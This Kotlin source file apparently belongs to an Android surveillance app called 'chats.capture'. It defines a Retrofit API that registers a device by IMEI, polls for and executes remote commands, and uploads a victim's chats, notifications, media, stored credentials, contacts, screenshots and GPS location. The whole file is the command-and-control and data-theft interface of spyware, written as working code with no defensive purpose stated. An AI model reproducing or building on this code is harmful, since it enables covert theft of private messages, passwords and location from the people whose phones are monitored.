package com.chats.capture.network

import com.chats.capture.models.ChatData
import com.chats.capture.models.NotificationData
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.http.*

interface ApiService {
    
    @POST("api/devices/register")
    suspend fun registerDevice(
        @Body deviceInfo: DeviceRegistrationRequest
    ): Response<ResponseBody>
    
    @POST("api/devices/{deviceId}/heartbeat")
    suspend fun sendHeartbeat(
        @Path("deviceId") deviceId: String,
        @Body heartbeat: HeartbeatRequest
    ): Response<ResponseBody>
    
    @GET("api/devices/{deviceId}/commands/pending")
    suspend fun getPendingCommands(
        @Path("deviceId") deviceId: String
    ): Response<ResponseBody>
    
    @PUT("api/commands/{commandId}/result")
    suspend fun updateCommandResult(
        @Path("commandId") commandId: String,
        @Body result: CommandResultRequest
    ): Response<ApiResponse>
    
    @POST("api/notifications")
    suspend fun uploadNotification(
        @Body notification: NotificationData
    ): Response<ApiResponse>
    
    @POST("api/notifications/batch")
    suspend fun uploadNotificationsBatch(
        @Body notifications: List<NotificationData>
    ): Response<ApiResponse>
    
    @POST("api/chats")
    suspend fun uploadChat(
        @Body chat: ChatData
    ): Response<ApiResponse>
    
    @POST("api/chats/batch")
    suspend fun uploadChatsBatch(
        @Body chats: List<ChatData>
    ): Response<ApiResponse>
    
    @Multipart
    @POST("api/media/upload")
    suspend fun uploadMedia(
        @Part("notificationId") notificationId: RequestBody,
        @Part("checksum") checksum: RequestBody,
        @Part("mimeType") mimeType: RequestBody,
        @Part("appPackage") appPackage: RequestBody,
        @Part file: MultipartBody.Part
    ): Response<MediaUploadResponse>
    
    @GET("api/notifications")
    suspend fun getNotifications(
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<ApiResponse>
    
    @GET("api/chats")
    suspend fun getChats(
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<ApiResponse>
    
    @POST("api/remote/command")
    suspend fun executeRemoteCommand(
        @Body command: RemoteCommand
    ): Response<RemoteCommandResponse>
    
    @POST("api/credentials")
    suspend fun uploadCredential(
        @Body credential: com.chats.capture.models.Credential
    ): Response<ApiResponse>
    
    @POST("api/credentials/batch")
    suspend fun uploadCredentialsBatch(
        @Body credentials: List<com.chats.capture.models.Credential>
    ): Response<ApiResponse>
    
    @Multipart
    @POST("api/devices/{deviceId}/screenshots")
    suspend fun uploadScreenshot(
        @Path("deviceId") deviceId: String,
        @Part screenshot: MultipartBody.Part
    ): Response<ApiResponse>
    
    @POST("api/devices/{deviceId}/location")
    suspend fun uploadLocation(
        @Path("deviceId") deviceId: String,
        @Body location: LocationData
    ): Response<ResponseBody>
    
    @POST("api/contacts")
    suspend fun uploadContact(
        @Body contact: com.chats.capture.models.Contact
    ): Response<ApiResponse>
    
    @POST("api/contacts/batch")
    suspend fun uploadContactsBatch(
        @Body contacts: List<com.chats.capture.models.Contact>
    ): Response<ApiResponse>
}

data class RemoteCommandResponse(
    val success: Boolean,
    val message: String? = null,
    val data: String? = null
)

data class ApiResponse(
    val success: Boolean,
    val message: String? = null,
    val data: Any? = null
)

data class MediaUploadResponse(
    val success: Boolean,
    val message: String? = null,
    val fileUrl: String? = null,
    val checksum: String? = null
)

data class DeviceRegistrationRequest(
    val deviceId: String,
    val deviceName: String? = null,
    val model: String? = null,
    val osVersion: String? = null,
    val imei: String? = null,
    val fcmToken: String? = null
)

data class HeartbeatRequest(
    val fcmToken: String? = null
)

data class CommandsResponse(
    val success: Boolean,
    val commands: List<ServerCommand>? = null
)

data class ServerCommand(
    val id: String? = null,
    val deviceId: String? = null,
    val action: String? = null,
    val parameters: Any? = null, // Can be Map or String (JSON)
    val status: String? = null,
    val createdAt: Long? = null,
    val executedAt: Long? = null
)

data class CommandResultRequest(
    val success: Boolean,
    val message: String? = null,
    val data: String? = null
)

data class LocationData(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float? = null,
    val altitude: Double? = null,
    val speed: Float? = null,
    val bearing: Float? = null,
    val timestamp: Long,
    val provider: String? = null
)
